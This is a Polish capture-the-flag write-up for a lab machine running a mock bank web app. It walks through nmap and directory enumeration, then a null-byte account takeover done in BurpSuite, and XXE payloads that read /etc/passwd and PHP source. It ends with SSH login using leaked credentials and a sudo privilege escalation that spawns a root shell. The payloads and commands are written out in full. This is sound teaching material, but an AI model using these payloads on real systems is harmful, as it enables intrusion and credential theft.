@@ -1,0 +1,489 @@
+Project 16 - Wykorzystanie narzędzia BurpSuite
+
+
+*Rekonesans*
+*Enumeracja za pomocą Nmap*
+```bash
+nmap -sC -sV 10.10.23.209
+```
+
+```bash
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-25 09:23 EDT
+Nmap scan report for 10.10.23.209
+Host is up (0.068s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 14:6b:67:4c:1e:89:eb:cd:47:a2:40:6f:5f:5c:8c:c2 (DSA)
+|   2048 66:42:f7:91:e4:7b:c6:7e:47:17:c6:27:a7:bc:6e:73 (RSA)
+|   256 a8:6a:92:ca:12:af:85:42:e4:9c:2b:0e:b5:fb:a8:8b (ECDSA)
+|_  256 62:e4:a3:f6:c6:19:ad:30:0a:30:a1:eb:4a:d3:12:d3 (ED25519)
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+*Otwarte porty*
+```bash
+22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+```
+
+*Serwer HTTP*
+```bash
+http://10.10.23.209
+```
+
+*Enumeracja za pomocą Gobuster*
+```
+gobuster dir -e -u http://10.10.23.209/ -t30 -w /usr/share/dirb/wordlists/common.txt
+```
+
+```bash
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.23.209/
+[+] Method:                  GET
+[+] Threads:                 30
+[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+2022/10/25 09:28:02 Starting gobuster in directory enumeration mode
+===============================================================
+http://10.10.23.209/admin.php            (Status: 200) [Size: 663]
+http://10.10.23.209/.htaccess            (Status: 403) [Size: 288]
+http://10.10.23.209/.hta                 (Status: 403) [Size: 283]
+http://10.10.23.209/.htpasswd            (Status: 403) [Size: 288]
+http://10.10.23.209/index.html           (Status: 200) [Size: 406]
+http://10.10.23.209/report               (Status: 200) [Size: 16912]
+http://10.10.23.209/scripts              (Status: 301) [Size: 313] [--> http://10.10.23.209/scripts/]
+http://10.10.23.209/server-status        (Status: 403) [Size: 292]                                   
+                                                                                                     
+===============================================================
+2022/10/25 09:28:15 Finished
+===============================================================
+
+```
+
+*Enumeracja za pomocą wfuzz*
+```
+wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -z list,php-txt-html --hc 404 http://10.10.23.209/FUZZ.FUZ2Z
+```
+
+```bash
+000000045:   200        24 L     57 W       406 Ch      "index - html"                                                                              
+000000040:   403        10 L     30 W       283 Ch      "php"                                                                                       
+000000042:   403        10 L     30 W       284 Ch      "html"                                                                                      
+000000193:   200        27 L     61 W       715 Ch      "register - php"                                                                            
+000000775:   200        25 L     56 W       663 Ch      "admin - php"                                                                               
+000001081:   200        111 L    193 W      2334 Ch     "forms - php"                                                                               
+000003673:   302        0 L      0 W        0 Ch        "logout - php"                                                                              
+000008779:   302        55 L     86 W       908 Ch      "dashboard - php"                                                                           
+000023254:   200        65 L     110 W      1104 Ch     "acc - php"                                                                                 
+000034243:   302        70 L     119 W      1259 Ch     "with - php"                                                                                
+000067519:   302        72 L     129 W      1399 Ch     "tra - php"                                                                                 
+000135718:   403        10 L     30 W       283 Ch      "php"                                                                                       
+000135720:   403        10 L     30 W       284 Ch      "html"
+```
+
+*Serwer HTTP*
+```bash
+http://10.10.23.209/report/
+```
+*Otwarcie pliku report*
+```bash
+file report 
+
+report: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=44ffe4e81d688f7b7
+```
+*Narzędzie strings*
+```bash
+strings report
+```
+lista użytkowników w systemie:
+```bash
+/lib64/ld-linux-x86-64.so.2
+__isoc99_scanf
+puts
+printf
+system
+__cxa_finalize
+strcmp
+__libc_start_main
+libc.so.6
+GLIBC_2.7
+GLIBC_2.2.5
+_ITM_deregisterTMCloneTable
+__gmon_start__
+_ITM_registerTMCloneTable
+u/UH
+[]A\A]A^A_
+admin@bank.a
+Password Updated Successfully!
+Sorry you can't update the password
+Welcome Guest
+===================Available Options==============
+1. Check users
+2. Add user
+3. Delete user
+4. change password
+5. Exit
+clear
+===============List of active users================
+support@bank.a
+contact@bank.a
+cyber@bank.a
+admins@bank.a
+sam@bank.a
+admin0@bank.a
+super_user@bank.a
+control_admin@bank.a
+it_admin@bank.a
+Welcome To ABC DEF Bank Managemet System!
+UserName : 
+Password : 
+guest
+Your Choice : 
+email : 
+not available for guest account
+Wrong option
+Wrong username or password
+;*3$"
+GCC: (Debian 9.3.0-15) 9.3.0
+crtstuff.c
+deregister_tm_clones
+__do_global_dtors_aux
+completed.7452
+__do_global_dtors_aux_fini_array_entry
+frame_dummy
+__frame_dummy_init_array_entry
+report.c
+__FRAME_END__
+__init_array_end
+_DYNAMIC
+__init_array_start
+__GNU_EH_FRAME_HDR
+_GLOBAL_OFFSET_TABLE_
+__libc_csu_fini
+update
+_ITM_deregisterTMCloneTable
+puts@@GLIBC_2.2.5
+_edata
+options
+system@@GLIBC_2.2.5
+users
+printf@@GLIBC_2.2.5
+__libc_start_main@@GLIBC_2.2.5
+__data_start
+strcmp@@GLIBC_2.2.5
+__gmon_start__
+__dso_handle
+_IO_stdin_used
+__libc_csu_init
+__bss_start
+main
+__isoc99_scanf@@GLIBC_2.7
+__TMC_END__
+_ITM_registerTMCloneTable
+__cxa_finalize@@GLIBC_2.2.5
+.symtab
+.strtab
+.shstrtab
+.interp
+.note.gnu.build-id
+.note.ABI-tag
+.gnu.hash
+.dynsym
+.dynstr
+.gnu.version
+.gnu.version_r
+.rela.dyn
+.rela.plt
+.init
+.plt.got
+.text
+.fini
+.rodata
+.eh_frame_hdr
+.eh_frame
+.init_array
+.fini_array
+.dynamic
+.got.plt
+.data
+.bss
+.comment
+```
+*Aktywni użytkownicy w systemie*
+```bash
+support@bank.a
+contact@bank.a
+cyber@bank.a
+admins@bank.a
+sam@bank.a
+admin0@bank.a
+super_user@bank.a
+control_admin@bank.a
+it_admin@bank.a
+```
+
+*Exploitacja*
+/register.php
+
+BurpSuite:
+```bash
+Proxy
+
+W Żądaniu w Repeater należy dokonać♥ zmiany:
+uname=admins%40bank.a%00&bank=ABC&password=1234&btn=Register+me%21
+
+Następnie w Proxy:
+uname=admins%40bank.a%00&bank=ABC&password=1234&btn=Register+me%21
+
+Forward
+I na stronie nacisnąć Login.
+
+Wyłączyć Burpsuite
+
+Zalogować się na stronie:
+Username: admin@bank.a
+Password: 1234
+```
+
+*Będąć już zalogowanym*
+```bash
+Zakładka: command
+Account Number: aaa
+Remark: aaa
+```
+*BurpSuite*
+```bash
+Proxy
+Dodać:
+<?xml version="1.0" encoding="UTF-8"?>
+	<!DOCTYPE replace [<!ENTITY test SYSTEM "file:///etc/passwd"> ]>
+<root>
+	<name>
+	    aaa
+	</name>
+	<search>
+		aaa zamienić na &test;
+	</search>
+</root>
+```
+Wynik:
+```bash
+Sorry, account number root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+libuuid:x:100:101::/var/lib/libuuid:
+syslog:x:101:104::/home/syslog:/bin/false
+messagebus:x:102:106::/var/run/dbus:/bin/false
+landscape:x:103:109::/var/lib/landscape:/bin/false
+sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
+cyber:x:1000:1000:cyber,,,:/home/cyber:/bin/bash
+mysql:x:107:113:MySQL Server,,,:/nonexistent:/bin/false
+yash:x:1002:1002:,,,:/home/yash:/bin/bash
+ is not active!
+```
+Można przeczytać plik /etc/passwd ale nie można przeczytac pliku /acc.php
+*php://filter*
+```bash
+Proxy
+Dodać:
+<?xml version="1.0" encoding="UTF-8"?>
+	<!DOCTYPE replace [<!ENTITY test SYSTEM "php://filter/convert.base64-encode/resource=acc.php"> ]>
+<root>
+	<name>
+	    aaa
+	</name>
+	<search>
+		aaa zamienić na &test;
+	</search>
+</root>
+```
+*Dekodowanie*
+```bash
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+form
+{
+  border: 2px solid black;
+  outline: #4CAF50 solid 3px;
+  margin: auto;
+  width:180px;
+  padding: 20px;
+  text-align: center;
+}
+
+
+ul {
+  list-style-type: none;
+  margin: 0;
+  padding: 0;
+  overflow: hidden;
+  background-color: #333;
+}
+
+li {
+  float: left;
+  border-right:1px solid #bbb;
+}
+
+li:last-child {
+  border-right: none;
+}
+
+li a {
+  display: block;
+  color: white;
+  text-align: center;
+  padding: 14px 16px;
+  text-decoration: none;
+}
+
+li a:hover:not(.active) {
+  background-color: #111;
+}
+
+.active {
+  background-color: blue;
+}
+</style>
+</head>
+<body>
+
+<ul>
+  <li><a href="dashboard.php">Dashboard</a></li>
+  <li><a href="with.php">Withdraw Money</a></li>
+  <li><a href="depo.php">Deposit Money</a></li>
+  <li><a href="tra.php">Transfer Money</a></li>
+  <li><a href="acc.php">My Account</a></li>
+  <li><a href="forms.php">command</a></li>
+  <li><a href="logout.php">Logout</a></li>
+  <li style="float:right"><a href="contact.php">Contact Us</a></li>
+</ul><br><br><br><br>
+
+</body>
+</html>
+
+<?php
+
+session_start();
+if(isset($_SESSION['favcolor']) and $_SESSION['favcolor']==="admin@bank.a")
+{
+
+echo "<h3 style='text-align:center;'>Weclome to Account control panel</h3>";
+echo "<form method='POST'>";
+echo "<input type='text' placeholder='Account number' name='acno'>";
+echo "<br><br><br>";
+echo "<input type='text' placeholder='Message' name='msg'>";
+echo "<input type='submit' value='Send' name='btn'>";
+echo "</form>";
+//MY CREDS :- cyber:super#secure&password!
+if(isset($_POST['btn']))
+{
+$ms=$_POST['msg'];
+echo "ms:".$ms;
+if($ms==="id")
+{
+system($ms);
+}
+else if($ms==="whoami")
+{
+system($ms);
+}
+else
+{
+echo "<script>alert('RCE Detected!')</script>";
+session_destroy();
+unset($_SESSION['favcolor']);
+header("Refresh: 0.1; url=index.html");
+}
+}
+}
+else
+{
+echo "<script>alert('Only Admins can access this page!')</script>";
+session_destroy();
+unset($_SESSION['favcolor']);
+header("Refresh: 0.1; url=index.html");
+}
+?>
+
+```
+*//MY CREDS :- cyber:super#secure&password!*
+
+*Logowanie do SSH*
+```bash
+ssh cyber@10.10.23.209
+password: super#secure&password!
+
+cat flag1.txt 
+THM{6f7e4dd134e19af144c88e4fe46c67ea}
+```
+*Sprawdzanie przywilejów sudo*
+```bash
+sudo -l
+User cyber may run the following commands on ubuntu:
+    (root) NOPASSWD: /usr/bin/python3 /home/cyber/run.py
+
+sudo /usr/bin/python3 /home/cyber/run.py
+```
+
+*Eskalacja przywilejów*
+```bash
+ls -la run.py
+-rwx------ 1 root root 349 Nov 15  2020 run.py
+```
+Właścicielem tego pliku jest **root** i możesz wykonać ten plik z prawami sudo. Ponieważ ten plik znajduje się w moim własnym katalogu _(użytkownik cyber)_ i ponieważ moge wprowadzać zmiany w tym katalogu, można utworzyć drugi plik **"run.py"** i spróbować go wykonać z tymi samymi uprawnieniami.
+```bash
+mv run.py run.py.orig
+
+nano run.py
+
+import os  
+os.system("/bin/bash")
+
+cat run.py
+
+```
+*Wykonanie pliku run.py*
+```bash
+sudo /usr/bin/python3 /home/cyber/run.py
+id
+```
+**Mam roota !!!**
+```basg
+cd yash
+cat flag2.txt 
+THM{20c1d18791a246001f5df7867d4e6bf5}
+
+cd /root
+cat root.txt
+THM{db12b4451d5e70e2a177880ecfe3428d}
+```
